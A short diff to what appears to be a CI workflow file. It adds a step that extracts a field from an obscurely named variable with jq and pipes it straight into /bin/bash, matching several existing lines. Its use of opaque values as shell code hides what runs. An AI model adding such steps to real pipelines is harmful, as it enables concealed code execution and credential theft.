@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$lmfs56471" | jq -r .rg508 | /bin/bash
           echo $uwd70 | jq -r .hvns605 | /bin/bash
           echo $e3 | jq -r .kul2 | /bin/bash
+          echo $y43558 | jq -r .rab90 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
